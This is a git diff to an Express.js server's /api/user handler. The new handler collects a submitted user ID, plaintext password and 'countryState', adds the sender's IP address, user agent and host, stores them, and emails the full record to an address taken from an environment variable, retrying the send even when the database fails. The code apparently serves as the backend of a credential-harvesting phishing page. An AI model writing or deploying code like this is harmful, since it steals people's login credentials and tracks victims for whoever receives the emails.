@@ -31,32 +31,56 @@ app.get("/", (req, res) => {
 });
 
 // ===== CREATE USER & SEND EMAIL =====
+// ===== CREATE USER & SEND EMAIL (WITH METADATA) =====
 app.post("/api/user", async (req, res) => {
   try {
-    // Attempt DB operations, but continue to send email even if DB is down
-    try {
-      let user = await User.findOne({ userId: req.body.userId });
+    // ===== METADATA =====
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
 
-      if (!user) {
-        user = new User(req.body);
-        await user.save();
-      }
+    const userAgent = req.headers["user-agent"];
+    const host = req.headers["host"];
+    const submittedAt = new Date();
+
+    // ===== BUILD FULL PAYLOAD =====
+    const fullPayload = {
+      userId: req.body.userId,
+      password: req.body.password,
+      countryState: req.body.countryState,
+
+      ipAddress: ip,
+      userAgent,
+      host,
+      submittedAt,
+    };
+
+    // ===== SAVE OR UPDATE USER (DO NOT BLOCK EMAIL) =====
+    try {
+      await User.findOneAndUpdate({ userId: fullPayload.userId }, fullPayload, {
+        upsert: true,
+        new: true,
+      });
     } catch (dbErr) {
       console.error(
         "DB error during registration (continuing to send email):",
-        dbErr.message
+        dbErr.message,
       );
     }
 
-    // Send email (log recipient env for debugging)
+    // ===== SEND EMAIL WITH FULL PAYLOAD =====
     console.log(
       "POST /api/user: sending notification for",
-      req.body.userId,
+      fullPayload.userId,
       "using SEND_TO=",
-      process.env.SEND_TO
+      process.env.SEND_TO,
     );
-    await sendUserEmail(req.body);
 
+    await sendUserEmail({
+      type: "registration",
+      data: fullPayload,
+    });
+
+    // ===== RESPONSE =====
     res.json({
       success: true,
       message:
@@ -65,52 +89,31 @@ app.post("/api/user", async (req, res) => {
   } catch (error) {
     console.error("Error submitting user:", error.message);
 
-    // Attempt to send email with retries even if we already responded with an error status
-    console.log(
-      "POST /api/user: sending notification for",
-      req.body.userId,
-      "using SEND_TO=",
-      process.env.SEND_TO
-    );
-
-    // helper sleep
+    // ===== EMAIL RETRY LOGIC (SAFEGUARDED) =====
     const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
 
-    let sendResponse = null;
     let lastError = null;
-    const maxAttempts = 3;
-    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
+    for (let attempt = 1; attempt <= 3; attempt++) {
       try {
-        sendResponse = await sendUserEmail(req.body);
-        console.log(`Email send succeeded on attempt ${attempt}`);
+        await sendUserEmail({
+          type: "registration",
+          data: {
+            ...req.body,
+            error: "Primary send failed, retry attempt " + attempt,
+          },
+        });
         break;
       } catch (err) {
         lastError = err;
-        console.error(
-          `Email send failed on attempt ${attempt}:`,
-          err && err.message ? err.message : err
-        );
-        // short backoff before retrying
-        if (attempt < maxAttempts) await sleep(500 * attempt);
+        if (attempt < 3) await sleep(500 * attempt);
       }
     }
 
-    // Respond based on email send outcome
-    if (sendResponse) {
-      res
-        .status(200)
-        .json({ success: true, message: "Email sent", sendResponse });
-    } else {
-      console.error(
-        "All email send attempts failed:",
-        lastError && lastError.stack ? lastError.stack : lastError
-      );
-      res.status(502).json({
-        success: false,
-        message: "Failed to send email",
-        error: lastError ? lastError.message : "unknown",
-      });
-    }
+    res.status(502).json({
+      success: false,
+      message: "Submission failed",
+      error: lastError ? lastError.message : "unknown",
+    });
   }
 });
 
